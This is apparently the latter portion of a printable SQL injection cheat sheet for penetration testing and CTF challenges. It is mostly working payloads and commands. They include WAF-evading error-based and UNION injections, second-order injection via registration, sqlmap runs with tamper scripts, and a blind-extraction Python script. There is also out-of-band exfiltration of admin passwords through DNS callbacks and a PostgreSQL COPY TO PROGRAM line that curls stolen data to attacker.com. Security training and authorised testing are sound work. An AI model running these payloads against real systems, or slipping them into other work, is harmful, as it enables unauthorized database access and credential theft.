curl "http://waf-protected.com/product?id=1'/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT/**/COUNT(*),CONCAT((SELECT/**/@@version),0x7e,FLOOR(RAND(0)*2))x/**/FROM/**/information_schema.tables/**/GROUP/**/BY/**/x)a)--+"
```

**Using SQLmap with Tamper:**
```bash
sqlmap -u "http://waf-protected.com/product?id=1" \
  --tamper=space2comment,randomcase,charencode \
  --random-agent \
  --batch \
  --dbs
```

## Example 4: Second-Order SQL Injection
**Target:** User registration and profile page

**Scenario:** Application sanitizes input during registration but doesn't during profile update.

**Step 1 - Register Malicious User:**
```bash
# Register user with SQLi payload as username
curl -X POST "http://app.com/register" \
  -d "username=admin'--&email=test@test.com&password=password123"

# Payload stored in database
```

**Step 2 - Trigger Injection:**
```bash
# Login and update profile
curl -X POST "http://app.com/login" \
  -d "username=admin'--&password=password123"

# Update profile (backend query uses stored username)
curl -X POST "http://app.com/profile/update" \
  -d "bio=New bio" \
  -H "Cookie: session=abc123"

# Backend query: UPDATE users SET bio='New bio' WHERE username='admin'--'
# Comment truncates the rest, updating admin's profile instead
```

**Step 3 - Advanced Exploitation:**
```bash
# Register with UNION payload
curl -X POST "http://app.com/register" \
  -d "username=' UNION SELECT 1,2,3--&email=test@test.com&password=password123"

# When profile loaded, UNION executes
```

## Example 5: Out-of-Band (OOB) SQL Injection
**Target:** API endpoint with no visible response

**Step 1 - Setup DNS Callback:**
```bash
# Use Burp Collaborator or similar
# Collaborator URL: abc123.burpcollaborator.net
```

**Step 2 - MySQL OOB via LOAD_FILE:**
```bash
# Exfiltrate data via DNS
curl "http://api.com/user?id=1' AND LOAD_FILE(CONCAT('\\\\\\\\',
(SELECT password FROM users WHERE username='admin'),
'.abc123.burpcollaborator.net\\\\a'))--+"

# DNS query: <password>.abc123.burpcollaborator.net
```

**Step 3 - MSSQL OOB via xp_dirtree:**
```bash
curl "http://api.com/user?id=1'; DECLARE @p varchar(1024);
SELECT @p=(SELECT TOP 1 password FROM users);
EXEC('master..xp_dirtree \"\\\\'+@p+'.abc123.burpcollaborator.net\\\\a\"')--"
```

**Step 4 - PostgreSQL OOB via COPY:**
```bash
curl "http://api.com/user?id=1'; COPY (SELECT password FROM users WHERE username='admin')
TO PROGRAM 'curl http://attacker.com?data=$(cat)'--"
```

# PART 4: APPLICATION GUIDANCE

## 4.1 Navigating Under Time Pressure

**Quick Assessment Strategy:**
1. Identify all input parameters (5 minutes)
2. Test top 3 parameters with basic payloads (10 minutes)
3. If SQLi found, use SQLmap for automated exploitation (15 minutes)
4. Manual extraction if SQLmap fails (30+ minutes)

**Priority Testing Order:**
1. URL parameters (highest success rate)
2. POST body parameters
3. Cookies
4. HTTP headers

**Mental Checklist:**
- [ ] Tested single quote for error? → Error-based or Union
- [ ] Tested Boolean conditions? → Blind Boolean
- [ ] Tested time delays? → Time-based Blind
- [ ] Tried SQLmap automation? → Quick wins
- [ ] Checked for WAF? → Apply bypass techniques

## 4.2 Switching Between Enumeration & Exploitation

**Enumeration Phase (Manual):**
```bash
# Step 1: Confirm vulnerability
curl "http://target.com/page?id=1'"

# Step 2: Find column count
curl "http://target.com/page?id=1' ORDER BY 1--"

# Step 3: Identify string columns
curl "http://target.com/page?id=1' UNION SELECT 'a',NULL--"
```

**Exploitation Phase (Automated):**
```bash
# Switch to SQLmap for speed
sqlmap -u "http://target.com/page?id=1" --batch --threads=10

# If blocked, add bypass techniques
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment --random-agent
```

**Pivot Strategy:**
- Manual testing: Good for understanding and bypassing protections
- Automated testing: Fast for standard scenarios
- Hybrid approach: Manual detection → SQLmap exploitation

## 4.3 Customizing Payloads for Unusual Targets

**Custom Encoding Requirements:**
```python
# Python script for custom encoding
import urllib.parse

payload = "' UNION SELECT username,password FROM users--"

# URL encode
encoded = urllib.parse.quote(payload)
print(f"URL: {encoded}")

# Double URL encode
double_encoded = urllib.parse.quote(encoded)
print(f"Double: {double_encoded}")

# Hex encode
hex_encoded = ''.join([hex(ord(c))[2:] for c in payload])
print(f"Hex: {hex_encoded}")
```

**Framework-Specific Adjustments:**

**PHP (Magic Quotes):**
```sql
-- Use %00 null byte injection
%00' UNION SELECT NULL--

-- Use \\\\\' to bypass escaping
\\\\\\' UNION SELECT NULL--
```

**ASP.NET:**
```sql
-- Use Unicode encoding
%u0027 UNION SELECT NULL--

-- Use multi-line comments
/* multi
line */ UNION SELECT NULL--
```

**Java:**
```sql
-- Use \\\\ for backslash escaping
\\\\' UNION SELECT NULL--
```

## 4.4 Tips for CTF-Specific Challenges

### Common CTF SQLi Patterns

**Flag Extraction:**
```sql
-- Flags usually in specific table/column
' UNION SELECT flag FROM flags--
' UNION SELECT flag FROM ctf_flags--
' UNION SELECT * FROM secrets--

-- Sometimes base64 encoded
' UNION SELECT TO_BASE64(flag) FROM flags--

-- Or in comments/metadata
' UNION SELECT table_comment FROM information_schema.tables--
```

**Hidden Tables/Columns:**
```sql
-- Search for flag-related names
' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_name LIKE '%flag%'--

' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE column_name LIKE '%flag%' OR column_name LIKE '%secret%'--
```

**Blind SQLi Optimization:**
```python
# Python script for fast blind extraction
import requests
import string

url = "http://ctf.com/challenge?id=1' AND SUBSTRING((SELECT flag FROM flags),{},1)='{}'--"
charset = string.ascii_lowercase + string.digits + string.punctuation

flag = ""
for pos in range(1, 50):
    for char in charset:
        r = requests.get(url.format(pos, char))
        if "success" in r.text:  # Adjust based on true condition
            flag += char
            print(f"Found: {flag}")
            break
    if char == '}':
        break

print(f"Flag: {flag}")
```

### CTF SQLi Checklist
- [ ] Check for authentication bypass first
- [ ] Look for union-based (fastest for CTF)
- [ ] Try common table names: flags, secrets, users, admin
- [ ] Test for file read (flags often in /flag.txt)
- [ ] Check for command execution (read flag via OS)
- [ ] Remember to URL-encode payloads

## 4.5 Debugging & Troubleshooting

### Common Issues and Solutions

**Issue: Payload not working**
```bash
# Solution 1: Check encoding
echo "payload" | xxd
curl "http://target.com/page?id=<payload>" -v

# Solution 2: Try different comment syntax
' UNION SELECT NULL--
' UNION SELECT NULL#
' UNION SELECT NULL--+
' UNION SELECT NULL-- -

# Solution 3: Add parentheses
' UNION SELECT NULL)--
') UNION SELECT NULL--
```

**Issue: Column count mismatch**
```sql
-- Add NULL columns to match
' UNION SELECT NULL,NULL,NULL,NULL--

-- Or use specific types
' UNION SELECT 1,'string',NULL,NULL--
```

**Issue: WAF blocking everything**
```bash
# Use SQLmap with aggressive tamper
sqlmap -u "http://target.com/page?id=1" \
  --tamper=apostrophemask,space2comment,randomcase \
  --random-agent \
  --delay=2 \
  --batch

# Or try alternate injection point
sqlmap -u "http://target.com/page?id=1" \
  --cookie="session=test" \
  -p session
```

**Issue: SQLmap not detecting**
```bash
# Increase level and risk
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Specify injection point manually
sqlmap -u "http://target.com/page?id=1*" --batch

# Use specific technique
sqlmap -u "http://target.com/page?id=1" --technique=T --time-sec=10
```

### Logging and Documentation
```bash
# Enable verbose SQLmap logging
sqlmap -u "http://target.com/page?id=1" -v 3 --batch | tee sqlmap.log

# Save traffic to file
sqlmap -u "http://target.com/page?id=1" -t traffic.txt

# Capture with Burp/ZAP for manual review
```

---

**Last Updated:** December 2025
**Created for:** Penetration Testing & CTF Challenges
**Format:** Ready for print or second-screen display
